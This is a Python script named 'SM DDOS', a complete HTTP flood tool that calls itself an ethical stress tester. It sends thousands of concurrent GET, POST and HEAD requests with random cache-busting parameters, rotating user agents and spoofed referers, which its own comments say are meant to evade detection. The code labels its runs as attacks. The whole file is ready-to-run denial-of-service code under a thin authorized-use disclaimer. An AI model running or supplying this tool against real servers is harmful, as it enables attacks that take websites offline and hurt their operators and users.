#!/usr/bin/env python3
# ----------------------------------------------------------------------------------------------
# SM DDOS - High-Power HTTP Stress Testing Tool for Termux/VPS
#
# This tool is designed for ethical stress-testing of HTTP servers to evaluate resilience.
# It sends high-volume, varied HTTP requests to test server capacity, meant for authorized use only.
# Unauthorized use is prohibited and illegal.
#
# Author: Optimized for Termux/VPS and GitHub, version 3.4
# Updates: Increased concurrency, larger payloads, multiple endpoints, enhanced anti-detection.
# ----------------------------------------------------------------------------------------------

import aiohttp
import asyncio
import random
import sys
import time
import logging
from urllib.parse import urlparse
from statistics import mean

# Configuration
CONFIG = {
    'max_requests': 10000,     # Total requests (increased for stress)
    'timeout': 120,            # Test duration (seconds)
    'batch_size': 100,         # Simultaneous requests (increased)
    'request_rate': 50,        # Requests per second (increased)
    'max_retries': 3,          # Retry attempts for failed requests
    'request_types': ['GET', 'POST', 'HEAD'],
    'log_file': 'ddos_test.log',
    'target_urls': [],         # Filled dynamically
    'payload_size': 1024       # Max POST payload size (bytes)
}

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(CONFIG['log_file']),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Global variables
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
successful_requests = 0
failed_requests = 0
response_times = []

def useragent_list():
    """Generate a diverse list of User-Agent strings to evade detection."""
    global headers_useragents
    headers_useragents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/127.0.0.0',
        'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15'
    ]
    return headers_useragents

def referer_list():
    """Generate a list of referer URLs."""
    global headers_referers
    headers_referers = [
        'https://www.google.com/?q=',
        'https://www.bing.com/search?q=',
        'https://search.yahoo.com/search?p=',
        f'https://{host}/',
        'https://duckduckgo.com/?q=',
        'https://www.facebook.com/',
        'https://www.twitter.com/'
    ]
    return headers_referers

def buildblock(size):
    """Generate a random ASCII string for query parameters or payloads."""
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

async def httpcall(session, target_url, retry=0):
    """Send a varied HTTP request with randomized headers and payloads."""
    global request_counter, successful_requests, failed_requests, response_times
    param_joiner = "&" if "?" in target_url else "?"
    target_url = f"{target_url}{param_joiner}{buildblock(random.randint(3, 10))}={buildblock(random.randint(3, 10))}"
    headers = {
        'User-Agent': random.choice(headers_useragents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 10)),
        'Connection': 'keep-alive',
        'Host': host
    }
    request_type = random.choice(CONFIG['request_types'])
    start_time = time.time()
    try:
        if request_type == 'POST':
            data = {'data': buildblock(random.randint(100, CONFIG['payload_size']))}
            async with session.post(target_url, headers=headers, data=data, timeout=15) as response:
                status = response.status
        elif request_type == 'HEAD':
            async with session.head(target_url, headers=headers, timeout=15) as response:
                status = response.status
        else:  # GET
            async with session.get(target_url, headers=headers, timeout=15) as response:
                status = response.status
        response_time = time.time() - start_time
        response_times.append(response_time)
        successful_requests += 1
        if status >= 500:
            logger.warning(f"Server returned {status} - possible overload")
        elif status == 429:
            logger.warning("Server rate-limiting detected (429)")
        request_counter += 1
        logger.debug(f"Request {request_counter} to {target_url} succeeded: {status}, Time: {response_time:.3f}s")
        return status
    except aiohttp.ClientError as e:
        logger.error(f"Request to {target_url} failed: {e}")
        failed_requests += 1
        request_counter += 1
        if retry < CONFIG['max_retries']:
            logger.debug(f"Retrying request {request_counter} (Attempt {retry + 1}/{CONFIG['max_retries']})")
            await asyncio.sleep(0.2)  # Reduced delay for faster retries
            return await httpcall(session, target_url, retry + 1)
        logger.error(f"Request {request_counter} failed after {CONFIG['max_retries']} retries")
        return None

async def run_attack():
    """Run the high-power DDoS attack with optimized concurrency and rate control."""
    global request_counter, successful_requests, failed_requests, response_times
    useragent_list()
    referer_list()
    start_time = time.time()
    
    connector = aiohttp.TCPConnector(limit=200, ttl_dns_cache=300)  # Increased for power
    async with aiohttp.ClientSession(connector=connector) as session:
        while request_counter < CONFIG['max_requests'] and (time.time() - start_time) < CONFIG['timeout']:
            tasks = []
            remaining_requests = CONFIG['max_requests'] - request_counter
            current_batch_size = min(CONFIG['batch_size'], remaining_requests, CONFIG['request_rate'])
            for _ in range(current_batch_size):
                target_url = random.choice(CONFIG['target_urls'])  # Hit random endpoints
                tasks.append(httpcall(session, target_url))
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
                logger.info(f"Sent {request_counter} requests (Success: {successful_requests}, Failed: {failed_requests})")
            await asyncio.sleep(0.01)  # Minimal delay for max power
    duration = time.time() - start_time
    success_rate = (successful_requests / request_counter * 100) if request_counter > 0 else 0
    avg_response_time = mean(response_times) if response_times else 0
    logger.info(f"Attack finished: {request_counter} requests sent in {duration:.2f} seconds")
    logger.info(f"Success rate: {success_rate:.2f}% (Successful: {successful_requests}, Failed: {failed_requests})")
    logger.info(f"Average response time: {avg_response_time:.3f} seconds")

def usage():
    """Print usage instructions."""
    print('---------------------------------------------------')
    print('USAGE: python3 ddos.py <url> [max_requests] [request_rate]')
    print('Example: python3 ddos.py https://sm5test.rf.gd/SM/sm-bomber.html 10000 50')
    print('Run on Termux/VPS for ethical stress-testing only.')
    print(f'Logs saved to {CONFIG["log_file"]} for analysis.')
    print('Adjust config in script for intensity.')
    print('---------------------------------------------------')

def main():
    """Main function to initialize and run the attack."""
    global url, host
    if len(sys.argv) < 2:
        usage()
        sys.exit(1)
    
    url = sys.argv[1]
    if len(sys.argv) > 2:
        try:
            CONFIG['max_requests'] = int(sys.argv[2])
        except ValueError:
            logger.error("max_requests must be an integer")
            sys.exit(1)
    if len(sys.argv) > 3:
        try:
            CONFIG['request_rate'] = int(sys.argv[3])
        except ValueError:
            logger.error("request_rate must be an integer")
            sys.exit(1)
    
    if not url.startswith(('http://', 'https://')):
        url = f'https://{url}'
    parsed_url = urlparse(url)
    if not parsed_url.netloc:
        logger.error("Invalid URL format")
        sys.exit(1)
    
    global host
    host = parsed_url.netloc
    # Target multiple endpoints
    CONFIG['target_urls'] = [
        f'https://{host}/SM/sm-bomber.html',
        f'https://{host}/',
        f'https://{host}/index.html'
    ]
    logger.info(f"Starting SM DDOS attack on {url} (Host: {host})")
    try:
        asyncio.run(run_attack())
    except KeyboardInterrupt:
        logger.info("Attack stopped by user")
    except Exception as e:
        logger.error(f"Attack failed: {e}")

if __name__ == '__main__':
    main()
